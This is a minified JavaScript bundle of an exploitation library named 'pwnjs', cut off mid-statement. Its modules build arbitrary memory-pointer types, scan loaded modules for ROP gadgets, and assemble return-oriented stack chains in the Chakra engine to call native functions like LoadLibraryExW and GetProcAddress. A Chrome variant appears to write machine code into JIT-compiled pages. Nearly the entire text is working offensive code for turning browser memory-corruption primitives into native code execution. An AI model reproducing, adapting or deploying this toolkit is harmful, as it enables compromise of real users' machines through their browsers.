var pwnjs=function(t){var i={};function r(e){if(i[e])return i[e].exports;var s=i[e]={i:e,l:!1,exports:{}};return t[e].call(s.exports,s,s.exports,r),s.l=!0,s.exports}return r.m=t,r.c=i,r.d=function(t,i,e){r.o(t,i)||Object.defineProperty(t,i,{configurable:!1,enumerable:!0,get:e})},r.n=function(t){var i=t&&t.__esModule?function(){return t.default}:function(){return t};return r.d(i,"a",i),i},r.o=function(t,i){return Object.prototype.hasOwnProperty.call(t,i)},r.p="",r(r.s=3)}([function(t,i,r){"use strict";
/**
 * @license long.js (c) 2013 Daniel Wirtz <dcode@dcode.io>
 * Released under the Apache License, Version 2.0
 * see: https://github.com/dcodeIO/long.js for details
 */var e=function(){function t(t,i,r,e){this.size=e||64,8==e?(t&=255,r||t<128?i=0:(t|=4294967040,i=4294967295)):16==e?(t&=65535,r||t<32768?i=0:(t|=4294901760,i=4294967295)):32==e&&(i=r||(0|t)>=0?0:4294967295),this.low=0|t,this.high=0|i,this.unsigned=!!r}function i(t){return!0===(t&&t.__isInteger__)}t.prototype.__isInteger__,Object.defineProperty(t.prototype,"__isInteger__",{value:!0,enumerable:!1,configurable:!1}),t.isInteger=i;var r={},e={};function s(t,i){var s,n,o;return i?(o=0<=(t>>>=0)&&t<256)&&(n=e[t])?n:(s=a(t,(0|t)<0?-1:0,!0),o&&(e[t]=s),s):(o=-128<=(t|=0)&&t<128)&&(n=r[t])?n:(s=a(t,t<0?-1:0,!1),o&&(r[t]=s),s)}function n(t,i){if(isNaN(t)||!isFinite(t))return i?p:g;if(i){if(t<0)return p;if(t>=c)return b}else{if(t<=-l)return P;if(t+1>=l)return w}return t<0?n(-t,i).neg():a(t%u|0,t/u|0,i)}function a(i,r,e){return new t(i,r,e)}t.fromInt=s,t.fromNumber=n,t.fromBits=a;var o=Math.pow;function h(t,i,r){if(0===t.length)throw Error("empty string");if("NaN"===t||"Infinity"===t||"+Infinity"===t||"-Infinity"===t)return g;if("number"==typeof i?(r=i,i=!1):i=!!i,(r=r||10)<2||36<r)throw RangeError("radix");var e;if((e=t.indexOf("-"))>0)throw Error("interior hyphen");if(0===e)return h(t.substring(1),i,r).neg();for(var s=n(o(r,8)),a=g,d=0;d<t.length;d+=8){var u=Math.min(8,t.length-d),c=parseInt(t.substring(d,d+u),r);if(u<8){var l=n(o(r,u));a=a.mul(l).add(n(c))}else a=(a=a.mul(s)).add(n(c))}return a.unsigned=i,a}function d(i){return i instanceof t?i:"number"==typeof i?n(i):"string"==typeof i?h(i):a(i.low,i.high,i.unsigned)}t.fromString=h,t.fromValue=d;var u=4294967296,c=u*u,l=c/2,f=s(1<<24),g=s(0);t.ZERO=g;var p=s(0,!0);t.UZERO=p;var y=s(1);t.ONE=y;var _=s(1,!0);t.UONE=_;var v=s(-1);t.NEG_ONE=v;var w=a(-1,2147483647,!1);t.MAX_VALUE=w;var b=a(-1,-1,!0);t.MAX_UNSIGNED_VALUE=b;var P=a(0,-2147483648,!1);t.MIN_VALUE=P;var m=t.prototype;return m.toInt=function(){return this.unsigned?this.low>>>0:this.low},m.toNumber=function(){return this.unsigned?(this.high>>>0)*u+(this.low>>>0):this.high*u+(this.low>>>0)},m.toString=function(t){if((t=t||10)<2||36<t)throw RangeError("radix");if(this.isZero())return"0";if(this.isNegative()){if(this.eq(P)){var i=n(t),r=this.div(i),e=r.mul(i).sub(this);return r.toString(t)+e.toInt().toString(t)}return"-"+this.neg().toString(t)}for(var s=n(o(t,6),this.unsigned),a=this,h="";;){var d=a.div(s),u=(a.sub(d.mul(s)).toInt()>>>0).toString(t);if((a=d).isZero())return u+h;for(;u.length<6;)u="0"+u;h=""+u+h}},m.getHighBits=function(){return this.high},m.getHighBitsUnsigned=function(){return this.high>>>0},m.getLowBits=function(){return this.low},m.getLowBitsUnsigned=function(){return this.low>>>0},m.getNumBitsAbs=function(){if(this.isNegative())return this.eq(P)?64:this.neg().getNumBitsAbs();for(var t=0!=this.high?this.high:this.low,i=31;i>0&&0==(t&1<<i);i--);return 0!=this.high?i+33:i+1},m.isZero=function(){return 0===this.high&&0===this.low},m.isNegative=function(){return!this.unsigned&&this.high<0},m.isPositive=function(){return this.unsigned||this.high>=0},m.isOdd=function(){return 1==(1&this.low)},m.isEven=function(){return 0==(1&this.low)},m.equals=function(t){return i(t)||(t=d(t)),(this.unsigned===t.unsigned||this.high>>>31!=1||t.high>>>31!=1)&&(this.high===t.high&&this.low===t.low)},m.eq=m.equals,m.notEquals=function(t){return!this.eq(t)},m.neq=m.notEquals,m.lessThan=function(t){return this.comp(t)<0},m.lt=m.lessThan,m.lessThanOrEqual=function(t){return this.comp(t)<=0},m.lte=m.lessThanOrEqual,m.greaterThan=function(t){return this.comp(t)>0},m.gt=m.greaterThan,m.greaterThanOrEqual=function(t){return this.comp(t)>=0},m.gte=m.greaterThanOrEqual,m.compare=function(t){if(i(t)||(t=d(t)),this.eq(t))return 0;var r=this.isNegative(),e=t.isNegative();return r&&!e?-1:!r&&e?1:this.unsigned?t.high>>>0>this.high>>>0||t.high===this.high&&t.low>>>0>this.low>>>0?-1:1:this.sub(t).isNegative()?-1:1},m.comp=m.compare,m.negate=function(){return!this.unsigned&&this.eq(P)?P:this.not().add(y)},m.neg=m.negate,m.add=function(t){i(t)||(t=d(t));var r=this.high>>>16,e=65535&this.high,s=this.low>>>16,n=65535&this.low,o=t.high>>>16,h=65535&t.high,u=t.low>>>16,c=0,l=0,f=0,g=0;return f+=(g+=n+(65535&t.low))>>>16,l+=(f+=s+u)>>>16,c+=(l+=e+h)>>>16,c+=r+o,a((f&=65535)<<16|(g&=65535),(c&=65535)<<16|(l&=65535),this.unsigned,this.size)},m.subtract=function(t){return i(t)||(t=d(t)),this.add(t.neg())},m.sub=m.subtract,m.multiply=function(t){if(this.isZero())return g;if(i(t)||(t=d(t)),t.isZero())return g;if(this.eq(P))return t.isOdd()?P:g;if(t.eq(P))return this.isOdd()?P:g;if(this.isNegative())return t.isNegative()?this.neg().mul(t.neg()):this.neg().mul(t).neg();if(t.isNegative())return this.mul(t.neg()).neg();if(this.lt(f)&&t.lt(f))return n(this.toNumber()*t.toNumber(),this.unsigned);var r=this.high>>>16,e=65535&this.high,s=this.low>>>16,o=65535&this.low,h=t.high>>>16,u=65535&t.high,c=t.low>>>16,l=65535&t.low,p=0,y=0,_=0,v=0;return _+=(v+=o*l)>>>16,y+=(_+=s*l)>>>16,_&=65535,y+=(_+=o*c)>>>16,p+=(y+=e*l)>>>16,y&=65535,p+=(y+=s*c)>>>16,y&=65535,p+=(y+=o*u)>>>16,p+=r*l+e*c+s*u+o*h,a((_&=65535)<<16|(v&=65535),(p&=65535)<<16|(y&=65535),this.unsigned,this.size)},m.mul=m.multiply,m.divide=function(t){if(i(t)||(t=d(t)),t.isZero())throw Error("division by zero");if(this.isZero())return this.unsigned?p:g;var r,e,s;if(this.unsigned){if(t.unsigned||(t=t.toUnsigned()),t.gt(this))return p;if(t.gt(this.shru(1)))return _;s=p}else{if(this.eq(P))return t.eq(y)||t.eq(v)?P:t.eq(P)?y:(r=this.shr(1).div(t).shl(1)).eq(g)?t.isNegative()?y:v:(e=this.sub(t.mul(r)),s=r.add(e.div(t)));else if(t.eq(P))return this.unsigned?p:g;if(this.isNegative())return t.isNegative()?this.neg().div(t.neg()):this.neg().div(t).neg();if(t.isNegative())return this.div(t.neg()).neg();s=g}for(e=this;e.gte(t);){r=Math.max(1,Math.floor(e.toNumber()/t.toNumber()));for(var a=Math.ceil(Math.log(r)/Math.LN2),h=a<=48?1:o(2,a-48),u=n(r),c=u.mul(t);c.isNegative()||c.gt(e);)c=(u=n(r-=h,this.unsigned)).mul(t);u.isZero()&&(u=y),s=s.add(u),e=e.sub(c)}return s},m.div=m.divide,m.modulo=function(t){return i(t)||(t=d(t)),this.sub(this.div(t).mul(t))},m.mod=m.modulo,m.not=function(){return a(~this.low,~this.high,this.unsigned,this.size)},m.and=function(t){return i(t)||(t=d(t)),a(this.low&t.low,this.high&t.high,this.unsigned,this.size)},m.or=function(t){return i(t)||(t=d(t)),a(this.low|t.low,this.high|t.high,this.unsigned,this.size)},m.xor=function(t){return i(t)||(t=d(t)),a(this.low^t.low,this.high^t.high,this.unsigned,this.size)},m.shiftLeft=function(t){return i(t)&&(t=t.toInt()),0==(t&=63)?this:t<32?a(this.low<<t,this.high<<t|this.low>>>32-t,this.unsigned,this.size):a(0,this.low<<t-32,this.unsigned,this.size)},m.shl=m.shiftLeft,m.shiftRight=function(t){return i(t)&&(t=t.toInt()),0==(t&=63)?this:t<32?a(this.low>>>t|this.high<<32-t,this.high>>t,this.unsigned,this.size):a(this.high>>t-32,this.high>=0?0:-1,this.unsigned,this.size)},m.shr=m.shiftRight,m.shiftRightUnsigned=function(t){if(i(t)&&(t=t.toInt()),0===(t&=63))return this;var r=this.high;return t<32?a(this.low>>>t|r<<32-t,r>>>t,this.unsigned,this.size):a(32===t?r:r>>>t-32,0,this.unsigned,this.size)},m.shru=m.shiftRightUnsigned,m.toSigned=function(){return this.unsigned?a(this.low,this.high,!1,this.size):this},m.toUnsigned=function(){return this.unsigned?this:a(this.low,this.high,!0,this.size)},m.toBytes=function(t){return t?this.toBytesLE():this.toBytesBE()},m.toBytesLE=function(){var t=this.high,i=this.low;return[255&i,i>>>8&255,i>>>16&255,i>>>24&255,255&t,t>>>8&255,t>>>16&255,t>>>24&255]},m.toBytesBE=function(){var t=this.high,i=this.low;return[t>>>24&255,t>>>16&255,t>>>8&255,255&t,i>>>24&255,i>>>16&255,i>>>8&255,255&i]},t}();i.a=e},function(t,i,r){"use strict";var e=r(0);function s(t){var i=t/8,r=t/8,s={},n=[],a=this;function o(t){for(var i=new Uint8Array(t.length+1),r=0;r<t.length;r++)i[r]=t.charCodeAt(r);return i[r]=0,n.push(i),a.addressOfArrayBuffer(i.buffer)}function h(t){for(var i=new Uint16Array(t.length+1),r=0;r<t.length;r++)i[r]=t.charCodeAt(r);return i[r]=0,n.push(i),a.addressOfArrayBuffer(i.buffer)}function d(t){if(void 0!==a.LoadLibraryA)return a.call(W(a.LoadLibraryA),W(o(t)));if(void 0!==a.LoadLibraryW)return a.call(W(a.LoadLibraryW),W(h(t)));if(void 0!==a.LoadLibraryExA)return a.call(W(a.LoadLibraryExA),W(o(t)),W(0),W(0));if(void 0!==a.LoadLibraryExW)return a.call(W(a.LoadLibraryExW),W(h(t)),W(0),W(0));throw"missing load library address"}var u={get:function(t,i){try{var r=parseInt(i)}catch(r){return t[i]}return isNaN(r)?t[i]:t.add(r).load()},set:function(t,i,r){try{var e=parseInt(i)}catch(e){t[i]=r}return isNaN(e)?t[i]=r:t.add(e).store(r),!0}};function c(t,i){return this.type=t,this.address=i,new Proxy(this,u)}function l(t){return c.call(this,k,o(t))}function f(t){return c.call(this,O,h(t))}function g(){}function p(t){g.call(this),this.baseType=t,this.alignment=r,this.size=r}function y(t){g.call(this),this.returnType=t}c.prototype={},c.prototype.add=function(t){return new c(this.type,this.address.add(W(t).mul(this.type.size)))},c.prototype.load=function(){return this.type.load(this.address)},c.prototype.store=function(t){return this.type.store(this.address,t)},c.prototype.toString=function(){return"&0x"+this.address.toString(16)},c.prototype.isNull=function(){return this.address.eq(0)},l.prototype=Object.create(c.prototype),l.prototype.constructor=l,f.prototype=Object.create(c.prototype),f.prototype.constructor=f,g.prototype={get Ptr(){return this._ptr||(this._ptr=new p(this)),this._ptr}},g.prototype.constructor=g,p.prototype=Object.create(g.prototype),p.prototype.constructor=p,p.prototype.cast=function(t){return t=W(t),this.baseType instanceof b?new c(this.baseType.baseType,new e.a(t.low,t.high,!0,8*r)):this.baseType instanceof w?new v(this.baseType,new e.a(t.low,t.high,!0,8*r)):new c(this.baseType,new e.a(t.low,t.high,!0,8*r))},p.prototype.load=function(t){return this.cast(a.read(t,8*r))},p.prototype.store=function(t,i){return a.write(t,W(i),8*r)},y.prototype=Object.create(g.prototype),y.prototype.constructor=y,y.prototype.cast=function(t){var i=this.returnType||null,r=function(...r){var e=a.call(t,...r);return i&&(e=i.cast(e)),e};return r.address=t,r.toString=function(){return"&0x"+this.address.toString(16)},r};var _={get:function(t,i){var r=t.type.offsets[i];if(void 0!==r){var e=t.type.types[i],s=new p(e).cast(t.address.add(r));return e instanceof b||e instanceof w?s:s.load()}try{var n=parseInt(i)}catch(r){return t[i]}return isNaN(n)?t[i]:t.add(n)},set:function(t,i,r){var e=t.type.offsets[i];if(void 0!==e){var s=t.type.types[i];if(s instanceof w)throw"cannot set struct field";new p(s).cast(t.address.add(e)).store(r)}else{try{var n=parseInt(i)}catch(e){t[i]=r}if(!isNaN(n))throw"cannot set struct via array syntax";t[i]=r}}};function v(t,i){return this.type=t,this.address=i,new Proxy(this,_)}function w(t,r){g.call(this),r=r||i,this.fields=t,this.alignment=0,this.offsets={},this.types={};for(var e=0,s=0;s<t.length;s++){var n=t[s][0],a=t[s][1];if(void 0!==this.offsets[n])throw"duplicate field name";var o=Math.min(r,a.alignment);this.alignment=Math.max(this.alignment,o),e%o&&(e+=o-e%o),this.offsets[n]=e,this.types[n]=a,e+=a.size}if(0==e)throw"empty struct";e%this.alignment&&(e+=this.alignment-e%this.alignment),this.size=e}function b(t,i){g.call(this),this.baseType=t,this.length=i,this.alignment=this.baseType.alignment,this.size=this.length*this.baseType.size}function P(t,i){g.call(this),this.bits=t,this.signed=i,this.alignment=t/8,this.size=t/8}v.prototype={},v.prototype.add=function(t){return new v(this.type,this.address.add(W(t).mul(this.type.size)))},v.prototype.toString=function(){return"&0x"+this.address.toString(16)},w.prototype=Object.create(g.prototype),w.prototype.constructor=w,b.prototype=Object.create(g.prototype),b.prototype.constructor=b,b.prototype.load=function(t){for(var i=new Array(this.length),r=this.baseType.size,e=0;e<this.length;e++)i[e]=this.baseType.load(t),t=t.add(r);return i},b.prototype.store=function(t,i){for(var r=this.baseType.size,e=0;e<i.length;e++)this.baseType.store(t,i[e]),t=t.add(r)},P.prototype=Object.create(g.prototype),P.prototype.constructor=P,P.prototype.cast=function(t){return t=W(t),new e.a(t.low,t.high,!this.signed,this.bits)},P.prototype.load=function(t){return this.cast(a.read(t,this.bits))},P.prototype.store=function(t,i){return a.write(t,W(i),this.bits)};var m=new P(8,!0),E=new P(16,!0),U=new P(32,!0),T=new P(64,!0),k=new P(8,!1),O=new P(16,!1),x=new P(32,!1),A=new P(64,!1),C=new p(m),I=new p(E),R=new p(U),L=new p(T),B=new p(k),M=new p(O),N=new p(x),S=new p(A);function W(t){if("object"!=typeof t)return e.a.fromValue(t);if(t instanceof c||t instanceof v)return new e.a(t.address.low,t.address.high);if(t instanceof e.a)return new e.a(t.low,t.high);throw"unhandled type"}Object.assign(this,{importFunction:function(t,i,r){return r=r||null,void 0===s[t]&&(s[t]=d(t)),new y(r).cast(function(t,i){var r=a.call(W(a.GetProcAddress),W(t),W(o(i)));if(0==r)throw"missing import "+i;return r}(s[t],i))},loadLibrary:d,Pointer:c,CString:l,WString:f,ArrayType:b,FunctionType:y,PointerType:p,StructType:w,Integer:e.a,Int8:m,Int16:E,Int32:U,Int64:T,Uint8:k,Uint16:O,Uint32:x,Uint64:A,Int8Ptr:C,Int16Ptr:I,Int32Ptr:R,Int64Ptr:L,Uint8Ptr:B,Uint16Ptr:M,Uint32Ptr:N,Uint64Ptr:S})}s.prototype={},s.prototype.findModuleBase=function(t){for(t.low&=4294901760;;){var i=this.Uint8Ptr.cast(t);if(77==i[0]&&90==i[1]){var r=this.Uint32Ptr.cast(i.add(60))[0];if(r<4096&&80==i[r]&&69==i[r.add(1)])return t}t=t.sub(65536)}},s.prototype.findGadget=function(t,i){for(var r=this.Uint8Ptr.cast(t),e=this.Uint32Ptr.cast(r.add(60))[0],s=this.Uint32Ptr.cast(t.add(e))[20],n=i.length,a=i[0],o=4096;o<s;o++){if(o%4==0){var h=this.Uint32Ptr.cast(r.add(o))[0].low;if((h>>>0&255)!=a&&(h>>>8&255)!=a&&(h>>>16&255)!=a&&(h>>>24&255)!=a){o+=3;continue}}for(var d=0;d<n&&!(i[d]>=0&&i[d]!=r[o+d]);d++);if(d==n)return r.add(o);o+=d}return null},s.prototype.findGadgets=function(t,i){for(var r=this.Uint8Ptr.cast(t),e=this.Uint32Ptr.cast(r.add(60))[0],s=this.Uint32Ptr.cast(t.add(e))[7],n=new Int32Array(s/4),a=r.address.add(4096),o=4096;o<s;o+=8){var h=this.read(a,64);n[o/4]=h.low,n[o/4+1]=h.high,a.low+=8,0==(0|a.low)&&(a.high+=1)}var d=new Uint8Array(n.buffer),u={};return i.forEach(t=>{for(var i=t[0],e=t[1],s=0;;){if((s=d.indexOf(e[0],s))<0)throw"missing gadget "+i;for(var n=1;n<e.length&&!(e[n]>=0&&d[s+n]!=e[n]);n++);if(n==e.length)break;s++}u[i]=r.add(s)}),u},i.a=s},function(module,__webpack_exports__,__webpack_require__){"use strict";var __WEBPACK_IMPORTED_MODULE_0_baseexploit__=__webpack_require__(1),__WEBPACK_IMPORTED_MODULE_1_integer__=__webpack_require__(0);function ChakraExploit(){var t=this;__WEBPACK_IMPORTED_MODULE_0_baseexploit__.a.call(this,64),this.Thread=function(i){var r=new Worker(i);r.onmessage=(i=>{if("CHAKRA_EXPLOIT"==i.data){for(var r=t.globalListFirst.load()[t.threadContextStackLimit].sub(49152).add(1048576),e=t.Uint64Ptr.cast(r).add(-1);!new __WEBPACK_IMPORTED_MODULE_1_integer__.a(1094861636,65536).eq(e.load());)if((e=e.add(-1)).address<=r.sub(65536))throw"unable to find canary";var s=t.Uint64Ptr.cast(e[1]);t.Uint64Ptr.cast(e[2])[7]=s,t.Int32Ptr.cast(s[7])[0]=1}else if(this.onmessage)return this.onmessage(i)}),this.onmessage=null,this.postMessage=r.postMessage.bind(r)}}ChakraExploit.prototype=Object.create(__WEBPACK_IMPORTED_MODULE_0_baseexploit__.a.prototype),ChakraExploit.prototype.constructor=ChakraExploit,ChakraExploit.prototype.initChakra=function(t){this.chakraBase=this.findModuleBase(t);if(this.gadgets=this.findGadgets(this.chakraBase,[["callLoadLibraryExW",[72,139,200,51,210,65,184,0,8,0,0,255,21]],["jmpGetProcAddress",[72,139,193,72,139,73,8,72,133,201,116,11,72,131,196,40,72,255,37]],["nopReturn",[195]],["popRaxReturn",[88,195]],["popRdxReturn",[90,195]],["popRspReturn",[92,195]],["popRbpReturn",[93,195]],["addRsp58Return",[72,131,196,88,195]],["storeRaxAtRdxReturn",[72,137,2,195]],["entrySlice",[139,248,65,131,-1,2]],["amd64CallFunction",[76,139,78,8,76,139,6,72,131,236,32,255]],["linkToBeginningThreadContext",[72,139,196,76,137,64,24,72,137,80,16,72,137,72,8,72,131,-1,-1,0]],["popRcxRdxR8R9Return",[72,139,76,36,8,72,139,84,36,16,76,139,68,36,24,76,139,76,36,32,72,255,224]],["addRsp28Return",[72,131,196,40,195]]]),this.amd64CallFunctionReturnOffset=208==this.gadgets.amd64CallFunction[12]?13:17,97==this.gadgets.linkToBeginningThreadContext[17])this.threadContextPrev=this.gadgets.linkToBeginningThreadContext[18]/8,this.threadContextNext=this.gadgets.linkToBeginningThreadContext[30]/8,this.globalListFirst=new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.linkToBeginningThreadContext).add(27).add(this.Int32Ptr.cast(this.gadgets.linkToBeginningThreadContext.add(23))[0]));else{if(161!=this.gadgets.linkToBeginningThreadContext[17])throw"unsupported version";this.threadContextPrev=this.gadgets.linkToBeginningThreadContext[18]/8,this.threadContextNext=this.gadgets.linkToBeginningThreadContext[33]/8,this.globalListFirst=new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.linkToBeginningThreadContext).add(30).add(this.Int32Ptr.cast(this.gadgets.linkToBeginningThreadContext.add(26))[0]))}for(var i=this.globalListFirst[0],r=0;49152!=(65535&i[r]);r++);this.threadContextStackLimit=r;i=this.gadgets.callLoadLibraryExW.add(17).add(this.Int32Ptr.cast(this.gadgets.callLoadLibraryExW.add(13)).load());this.LoadLibraryExW=new this.PointerType(this.Uint8Ptr).cast(i).load();i=this.gadgets.jmpGetProcAddress.add(23).add(this.Int32Ptr.cast(this.gadgets.jmpGetProcAddress.add(19)).load());if(this.GetProcAddress=new this.PointerType(this.Uint8Ptr).cast(i).load(),this.findStackTop(),this.locateArray=[{}],this.locateArrayPtr=new this.PointerType(this.Uint64Ptr).cast(this.addressOfSlow(this.locateArray))[5].add(3),!this.addressOfSlow(this.locateArray[0]).address.eq(this.locateArrayPtr[0]))throw"init of addressOf failed!"},ChakraExploit.prototype.addressOf=function(t){return this.locateArray[0]=t,this.locateArrayPtr[0]},ChakraExploit.prototype.addressOfArrayBuffer=function(t){var i=new DataView(t);return this.Uint64Ptr.cast(this.addressOf(i))[7]},ChakraExploit.prototype.findStackTop=function(){if(void 0===this.stackTop){if("undefined"!=typeof WorkerGlobalScope)var t=this.globalListFirst.load()[this.threadContextStackLimit],i=1048576;else t=this.globalListFirst.load()[this.threadContextStackLimit],i=10485760;var r=t.sub(49152).add(i);this.stackTop=r}},ChakraExploit.prototype.addressOfSlow=function(obj){var address;return eval("String.prototype.slice").call("",{valueOf:()=>{for(var t=this.gadgets,i=this.Uint64Ptr.cast(this.stackTop).add(-1);!this.Uint64.cast(t.entrySlice).eq(i.load());)if((i=i.add(-1)).address<=this.stackTop.sub(65536))throw"unable to find entrySlice";for(;!this.Uint64.cast(t.amd64CallFunction).add(this.amd64CallFunctionReturnOffset).eq(i.load());)if((i=i.add(1)).address>=this.stackTop)throw"unable to find amd64CallFunction";for(;!i[0].eq(new __WEBPACK_IMPORTED_MODULE_1_integer__.a(1111638594,65536))||!i[2].eq(new __WEBPACK_IMPORTED_MODULE_1_integer__.a(1094795585,65536));)if((i=i.add(1)).address>=this.stackTop)throw"unable to find canaries";address=this.Uint8Ptr.cast(i[1])}},0,0,0,obj,1111638594,obj,1094795585),address},ChakraExploit.prototype.customInt32Array=function(t){var i=new Int32Array(1),r=this.Uint64Ptr.cast(this.addressOf(i));return r[4]=2147483647,r[7]=t,i},ChakraExploit.prototype.call=function(address,...args){if(args.length>10)throw"too many arguments";var returnValAddr;return eval("String.prototype.slice").call("",{valueOf:()=>{for(var t=this.gadgets,i=this.Uint64.cast(t.amd64CallFunction).add(this.amd64CallFunctionReturnOffset),r=this.Uint64.cast(t.entrySlice),e=this.stackTop.sub(65536),s=this.customInt32Array(e),n=8184;n>=0&&(r.low!=s[2*n]||r.high!=s[2*n+1]);n-=1);if(0==n)throw"unable to find entrySlice";for(;i.low!=s[2*n]||i.high!=s[2*n+1];)if(8192==++n)throw"unable to find amd64CallFunction";var a=(s=this.Uint64Ptr.cast(e.add(8*n))).add(-2);s=s.add(-16384);var o=this.customInt32Array(s);for(n=32;n>=0;n--){o[4096*n/4]}function h(t,i,r){r=r.address?r.address:__WEBPACK_IMPORTED_MODULE_1_integer__.a.fromValue(r),t[2*i+0]=r.low,t[2*i+1]=r.high}h(o,n=4,t.popRaxReturn),h(o,++n,t.addRsp28Return),h(o,++n,t.popRcxRdxR8R9Return),n++,n++,void 0!==args[0]&&h(o,n,args[0]),n++,void 0!==args[1]&&h(o,n,args[1]),n++,void 0!==args[2]&&h(o,n,args[2]),n++,void 0!==args[3]&&h(o,n,args[3]),h(o,++n,t.nopReturn),h(o,++n,address),h(o,++n,t.addRsp58Return),n++,n+=4,void 0!==args[4]&&h(o,n,args[4]),n++,void 0!==args[5]&&h(o,n,args[5]),n++,void 0!==args[6]&&h(o,n,args[6]),n++,void 0!==args[7]&&h(o,n,args[7]),n++,void 0!==args[8]&&h(o,n,args[8]),n++,void 0!==args[9]&&h(o,n,args[9]),n++,void 0!==args[10]&&h(o,n,args[10]),h(o,++n,t.popRdxReturn),h(o,++n,s),h(o,++n,t.storeRaxAtRdxReturn),h(o,++n,t.popRaxReturn),h(o,++n,new __WEBPACK_IMPORTED_MODULE_1_integer__.a(0,262144)),h(o,++n,t.popRbpReturn),h(o,++n,a.load()),h(o,++n,t.popRspReturn),h(o,++n,a.add(2)),n++,a[0]=s,returnValAddr=s}}),returnValAddr[0]},__webpack_exports__.a=ChakraExploit},function(t,i,r){"use strict";Object.defineProperty(i,"__esModule",{value:!0});var e=r(1),s=r(2),n=r(4),a=r(5),o=r(6),h=r(0);r.d(i,"BaseExploit",function(){return e.a}),r.d(i,"ChakraExploit",function(){return s.a}),r.d(i,"ChakraThreadExploit",function(){return n.a}),r.d(i,"ChromeExploit",function(){return a.a}),r.d(i,"WebkitExploit",function(){return o.a}),r.d(i,"Integer",function(){return h.a})},function(module,__webpack_exports__,__webpack_require__){"use strict";var __WEBPACK_IMPORTED_MODULE_0_chakraexploit__=__webpack_require__(2),__WEBPACK_IMPORTED_MODULE_1_integer__=__webpack_require__(0);function ChakraThreadExploit(){__WEBPACK_IMPORTED_MODULE_0_chakraexploit__.a.call(this);var dvManager=new DataView(new ArrayBuffer(4096)),dvWorker=new DataView(new ArrayBuffer(4096));this.dvWorker=dvWorker,this.dvManager=dvManager,eval("String.prototype.slice").call("",{valueOf:function(){for(postMessage("CHAKRA_EXPLOIT");0==dvWorker.getInt32(0););}},0,0,0,0,1094861636,dvWorker,dvManager,1094795585);var vtable=new __WEBPACK_IMPORTED_MODULE_1_integer__.a(dvManager.getInt32(0,!0),dvManager.getInt32(4,!0));this.vtable=vtable,this.chakraBase=this.findModuleBase(vtable),this.initChakra(vtable)}ChakraThreadExploit.prototype=Object.create(__WEBPACK_IMPORTED_MODULE_0_chakraexploit__.a.prototype),ChakraThreadExploit.prototype.constructor=ChakraThreadExploit,ChakraThreadExploit.prototype.read=function(t,i){switch(this.dvManager.setInt32(56,t.low,!0),this.dvManager.setInt32(60,t.high,!0),i){case 8:return new __WEBPACK_IMPORTED_MODULE_1_integer__.a(this.dvWorker.getInt8(0,!0),0,!0);case 16:return new __WEBPACK_IMPORTED_MODULE_1_integer__.a(this.dvWorker.getInt16(0,!0),0,!0);case 32:return new __WEBPACK_IMPORTED_MODULE_1_integer__.a(this.dvWorker.getInt32(0,!0),0,!0);case 64:return new __WEBPACK_IMPORTED_MODULE_1_integer__.a(this.dvWorker.getInt32(0,!0),this.dvWorker.getInt32(4,!0),!0)}},ChakraThreadExploit.prototype.write=function(t,i,r){switch(this.dvManager.setInt32(56,t.low,!0),this.dvManager.setInt32(60,t.high,!0),r){case 8:return this.dvWorker.setInt8(0,0|i.low,!0);case 16:return this.dvWorker.setInt16(0,0|i.low,!0);case 32:return this.dvWorker.setInt32(0,0|i.low,!0);case 64:this.dvWorker.setInt32(0,0|i.low,!0),this.dvWorker.setInt32(4,0|i.high,!0)}},__webpack_exports__.a=ChakraThreadExploit},function(t,i,r){"use strict";var e=r(1);r(0);function s(){e.a.call(this,64)}s.prototype=Object.create(e.a.prototype),s.prototype.constructor=s,s.prototype.initChrome=function(t){this.chromeBase=this.findModuleBase(t);for(var i="",r=0;r<1e3;r++)i+="x["+r+"] += "+Math.random()+";\n";this.jitFunction=new Function("x",i);var e=new Array(1e3).fill(0);for(r=0;r<1e4;r++)this.jitFunction(e);this.gadgets=this.findGadgets(this.chromeBase,[["loadLibraryGetProcAddress",[72,141,13,-1,-1,-1,-1,255,21,-1,-1,-1,-1,72,139,248,72,133,192,15,132,-1,-1,-1,-1,72,141,21,-1,-1,-1,-1,72,139,200,255,21,-1,-1,-1,-1]],["mainThreadStack",[72,139,5,-1,-1,-1,-1,72,141,76,36,-1,72,43,193,72,141,29,-1,-1,-1,-1,72,59,5,-1,-1,-1,-1]]]),this.mainThreadStackBase=new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.mainThreadStack).add(7).add(this.Int32Ptr.cast(this.gadgets.mainThreadStack.add(3))[0]))[0],this.LoadLibraryW=new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.loadLibraryGetProcAddress).add(13).add(this.Int32Ptr.cast(this.gadgets.loadLibraryGetProcAddress.add(9))[0]))[0],this.GetProcAddress=new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.loadLibraryGetProcAddress).add(41).add(this.Int32Ptr.cast(this.gadgets.loadLibraryGetProcAddress.add(37))[0]))[0]},s.prototype.addressOf=function(t){var i=[t];return this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOfSlow(i))[2].sub(1))[2].sub(1)},s.prototype.addressOfArrayBuffer=function(t){return this.Uint64Ptr.cast(this.addressOf(t))[4]},s.prototype.addressOfSlow=function(t){var i,r=this.mainThreadStackBase;return t.toString=function(){for(var t=0;t>-4096;t--)if(322507578==r[t-2].high&&322376504==r[t-1].high){i=r[t].sub(1);break}return""},String.prototype.indexOf.call(t,322376504,322507578),i},s.prototype.call=function(t,...i){var r=this;function e(t){return t.high<=32767&&1==(7&t.low)}function s(t,i){return t[0]=72,t[1]=131,t[2]=196,t[3]=i,t.add(4)}function n(t,i){return t[0]=72,t[1]=184,r.Uint64Ptr.cast(t.add(2))[0]=i,t.add(10)}function a(t,i){return t[0]=72,t[1]=185,r.Uint64Ptr.cast(t.add(2))[0]=i,t.add(10)}function o(t,i){return t[0]=72,t[1]=186,r.Uint64Ptr.cast(t.add(2))[0]=i,t.add(10)}function h(t,i){return t[0]=73,t[1]=184,r.Uint64Ptr.cast(t.add(2))[0]=i,t.add(10)}function d(t,i){return t[0]=73,t[1]=185,r.Uint64Ptr.cast(t.add(2))[0]=i,t.add(10)}function u(t){return t[0]=80,t.add(1)}var c=this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(this.jitFunction))[7].sub(1));if(e(c[0])&&e(c[1])&&e(c[2])&&e(c[3]))var l=this.Uint8Ptr.cast(c).add(96);else l=this.Uint8Ptr.cast(c);var 